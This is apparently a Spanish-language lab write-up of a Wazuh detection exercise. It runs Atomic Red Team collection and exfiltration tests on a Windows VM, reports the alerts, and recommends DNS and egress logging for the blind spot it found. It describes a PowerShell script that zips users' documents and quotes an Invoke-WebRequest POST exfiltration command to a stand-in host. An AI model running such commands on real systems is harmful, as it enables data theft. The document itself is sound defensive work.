# Cadena 5 — Collection + Compresión + Exfiltration

**Fecha:** 27/10 · **Entorno:** Windows 10 Home (standalone, agente Wazuh instalado) · **Herramienta:** Atomic Red Team

## Resumen
Cadena de recolección y compresión de documentos locales seguida de un intento de exfiltración vía HTTP POST — la única de las 5 cadenas donde la detección de red **no** se produjo, y el motivo por qué es en sí mismo el hallazgo más valioso de esta cadena.

## Técnicas ejecutadas

| Hora | Técnica | Test | Rule ID | Detectado | Descripción de la regla |
|------|---------|------|---------|-----------|--------------------------|
| 18:17:44.205 | T1005 (Collection) | — | 92027 | Sí | Powershell process spawned powershell instance |
| 18:18:32.701 | T1053.005 (ruido) | — | 92154 | Sí (Falso Positivo) | Process loaded taskschd.dll module |
| 18:19:47.782 | T1041 (Exfiltration) | — | 92027 | Parcial — ver nota | Powershell process spawned powershell instance |

## Narrativa
El test de T1005 ejecuta un script de PowerShell que busca archivos `.doc`, `.docx` y `.txt` en `C:\Users\` y los comprime en un `.zip` dentro de `ExternalPayloads\T1005\` — capturado íntegramente por Wazuh vía el contenido del `CommandLine` del evento 92027 (PowerShell spawneando PowerShell), lo cual permitió reconstruir exactamente qué hacía el script sin necesidad de ninguna regla adicional.

El test de T1041 (exfiltración) ejecuta un script que escribe un archivo local y luego intenta un `Invoke-WebRequest -Uri example.com -Method POST` con ese contenido como body.

## El hallazgo central de esta cadena
**El test T1041 no generó ninguna alerta de red en Wazuh — no porque la detección fallara, sino porque la conexión de red nunca se estableció.** El Windows víctima de este lab no tiene salida a internet (está en una red interna sin NAT para esta VM específica), así que el intento de `Invoke-WebRequest` falló a nivel de conexión TCP antes de poder generar tráfico real. Tampoco había visibilidad de DNS habilitada en la configuración de Sysmon de esta máquina, por lo que ni siquiera quedó registrada la resolución del dominio `example.com`.

La única evidencia de la **intención** de exfiltrar datos quedó en el contenido del comando de PowerShell, capturado por Script Block Logging (vía el mismo evento 92027) — no en ningún evento de red.

## Falsos positivos identificados
- **T1053.005 / rule 92154 (18:18:32):** `taskschd.dll` cargado por `MicrosoftEdgeUpdate.exe` — actividad legítima del actualizador de Edge, sin relación con la cadena simulada.

## Conclusión
Esta cadena documenta una limitación real de cobertura, no un éxito de detección, y eso tiene más valor para un portfolio que esconderlo: un SOC real necesita visibilidad de red (logging de DNS, proxy, o NetFlow) además de telemetría de endpoint para detectar exfiltración — depender solo de Sysmon/Wazuh en el host deja un punto ciego exactamente en la fase donde más importa detectar, que es cuando los datos ya están saliendo. La recomendación de remediación documentada es habilitar el logging de eventos DNS en Sysmon (event ID 22) como mínimo, y añadir un control de salida (proxy/firewall con logging) como capa complementaria.

## Referencias
- https://attack.mitre.org/techniques/T1005/
- https://attack.mitre.org/techniques/T1041/
